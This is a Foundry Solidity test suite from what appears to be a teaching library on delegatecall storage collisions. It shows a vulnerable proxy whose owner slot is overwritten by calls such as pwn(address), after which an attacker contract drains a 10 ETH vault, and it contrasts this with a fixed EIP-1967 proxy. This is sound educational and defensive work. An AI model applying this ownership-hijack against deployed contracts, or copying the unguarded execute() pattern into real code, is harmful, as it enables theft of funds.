// SPDX-License-Identifier: MIT
// Test: Delegatecall vulnerability proof
// Run: forge test --match-path 'vuln-library/04-delegatecall/**' -vv
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "./VulnerableDelegatecall.sol";
import "./AttackerDelegatecall.sol";
import "./SafeDelegatecall.sol";

contract DelegatecallTest is Test {

    LogicContract          public logic;
    VulnerableDelegatecall public vuln;
    AttackerDelegatecall   public hack;

    SafeLogicContract public safeLogic;
    SafeDelegatecall  public safe;

    address deployer = makeAddr("deployer");
    address alice    = makeAddr("alice");
    address attacker = makeAddr("attacker");

    uint256 constant VAULT_BALANCE = 10 ether;

    function setUp() public {
        logic = new LogicContract();

        vm.deal(deployer, VAULT_BALANCE);
        vm.prank(deployer);
        vuln = new VulnerableDelegatecall{value: VAULT_BALANCE}(address(logic));

        vm.prank(attacker);
        hack = new AttackerDelegatecall(address(vuln));

        safeLogic = new SafeLogicContract();

        vm.deal(deployer, VAULT_BALANCE);
        vm.prank(deployer);
        safe = new SafeDelegatecall{value: VAULT_BALANCE}(address(safeLogic));
    }

    // ══════════════════════════════════════════════
    // STORAGE COLLISION TESTS — proves the bug
    // ══════════════════════════════════════════════

    /// @notice slot 0 in proxy is owner — confirmed before attack
    function test_ProxySlot0_IsOwner() public view {
        assertEq(vuln.owner(), deployer, "deployer should own the proxy");
        assertEq(vuln.getBalance(), VAULT_BALANCE);
    }

    /// @notice delegatecall to logic.pwn() overwrites proxy.owner via slot 0
    function test_StorageCollision_OverwritesOwner() public {
        address ownerBefore = vuln.owner();
        assertEq(ownerBefore, deployer);

        // encode a call to LogicContract.pwn(alice)
        bytes memory payload = abi.encodeWithSignature("pwn(address)", alice);

        // anyone can call execute() — no access control on the vulnerable proxy
        vm.prank(alice);
        vuln.execute(payload);

        // slot 0 in proxy was overwritten — owner is now alice
        address ownerAfter = vuln.owner();
        assertEq(ownerAfter, alice, "slot 0 collision overwrote owner with alice");
        assertNotEq(ownerAfter, ownerBefore);

        console.log("Owner before collision:", ownerBefore);
        console.log("Owner after  collision:", ownerAfter);
    }

    /// @notice setOwner() in logic also collides with proxy.owner at slot 0
    function test_StorageCollision_SetOwnerAlsoWorks() public {
        bytes memory payload = abi.encodeWithSignature(
            "setOwner(address)",
            attacker
        );
        vm.prank(attacker);
        vuln.execute(payload);

        assertEq(vuln.owner(), attacker, "setOwner also writes slot 0 - same collision");
    }

    /// @notice full attack: hijack owner then drain vault
    function test_AttackDrainsVulnerableVault() public {
        uint256 vaultBefore    = vuln.getBalance();
        uint256 attackerBefore = address(hack).balance;

        assertEq(vaultBefore, VAULT_BALANCE, "vault should start with 10 ETH");
        assertEq(attackerBefore, 0,          "attacker starts with nothing");

        vm.prank(attacker);
        hack.attack();

        uint256 vaultAfter    = vuln.getBalance();
        uint256 attackerAfter = address(hack).balance;

        assertEq(vaultAfter,    0,            "vault should be fully drained");
        assertEq(attackerAfter, VAULT_BALANCE, "attacker holds all 10 ETH");

        console.log("Vault before :", vaultBefore    / 1 ether, "ETH");
        console.log("Vault after  :", vaultAfter,               "ETH");
        console.log("Attacker ETH :", attackerAfter  / 1 ether, "ETH");
    }

    /// @notice after hijack, original owner cannot withdraw
    function test_AfterHijack_RealOwnerLockedOut() public {
        bytes memory payload = abi.encodeWithSignature("pwn(address)", attacker);
        vm.prank(attacker);
        vuln.execute(payload);

        // deployer tries to withdraw — fails because they no longer own the proxy
        vm.prank(deployer);
        vm.expectRevert("not owner");
        vuln.withdraw();
    }

    /// @notice non-owner calling execute on vulnerable proxy — no restriction
    function test_Vulnerable_AnyoneCanCallExecute() public {
        // alice is not the owner but can still call execute
        bytes memory payload = abi.encodeWithSignature("pwn(address)", alice);
        vm.prank(alice);
        vuln.execute(payload); // succeeds — no onlyOwner on execute
        assertEq(vuln.owner(), alice);
    }

    // ══════════════════════════════════════════════
    // FIX TESTS — proves the safe version blocks it
    // ══════════════════════════════════════════════

    /// @notice EIP-1967 slot stores implementation — not at slot 1
    function test_Safe_ImplementationAtEIP1967Slot() public view {
        address impl = safe.implementation();
        assertEq(impl, address(safeLogic), "implementation at EIP-1967 slot");

        // slot 1 in the safe proxy is funds — NOT the implementation address
        // confirming EIP-1967 slot is separate
        assertGt(safe.funds(), 0, "slot 1 is funds, not implementation");
    }

    /// @notice non-owner cannot call execute on safe proxy
    function test_Safe_Execute_RevertsForNonOwner() public {
        bytes memory payload = abi.encodeWithSignature(
            "transferOwnership(address)",
            attacker
        );
        vm.prank(attacker);
        vm.expectRevert("not owner");
        safe.execute(payload);

        // owner is unchanged
        assertEq(safe.owner(), deployer);
    }

    /// @notice attacker cannot steal ownership on safe proxy
    function test_Safe_OwnershipCannotBeStolen() public {
        address ownerBefore = safe.owner();

        // attempt the same attack
        bytes memory payload = abi.encodeWithSignature("pwn(address)", attacker);

        // execute is onlyOwner — attacker cannot call it
        vm.prank(attacker);
        vm.expectRevert("not owner");
        safe.execute(payload);

        assertEq(safe.owner(), ownerBefore, "owner unchanged");
    }

    /// @notice safe proxy: owner can legitimately call execute
    function test_Safe_LegitimateExecute_Works() public {
        bytes memory payload = abi.encodeWithSignature(
            "transferOwnership(address)",
            alice
        );
        vm.prank(deployer);
        safe.execute(payload);

        // transferOwnership writes slot 0 = new owner
        // slot 0 in safe proxy = owner — intentionally aligned
        assertEq(safe.owner(), alice, "legitimate ownership transfer via delegatecall");
    }

    /// @notice safe vault: funds cannot be drained by non-owner
    function test_Safe_FundsCannotBeDrained() public {
        assertEq(safe.getBalance(), VAULT_BALANCE);

        vm.prank(attacker);
        vm.expectRevert("not owner");
        safe.withdraw();

        assertEq(safe.getBalance(), VAULT_BALANCE, "funds intact");
    }

    // ══════════════════════════════════════════════
    // FUZZ TESTS
    // ══════════════════════════════════════════════

    /// @notice fuzz: any address can hijack ownership on the vulnerable proxy
    function testFuzz_Vulnerable_AnyAddressCanHijack(address who) public {
        vm.assume(who != address(0));
        bytes memory payload = abi.encodeWithSignature("pwn(address)", who);
        vuln.execute(payload);
        assertEq(vuln.owner(), who, "any address can become owner via collision");
    }

    /// @notice fuzz: no address can hijack safe proxy without being owner
    function testFuzz_Safe_NoAddressCanHijack(address who) public {
        vm.assume(who != deployer);
        bytes memory payload = abi.encodeWithSignature("pwn(address)", who);
        vm.prank(who);
        vm.expectRevert("not owner");
        safe.execute(payload);
        assertEq(safe.owner(), deployer);
    }

}
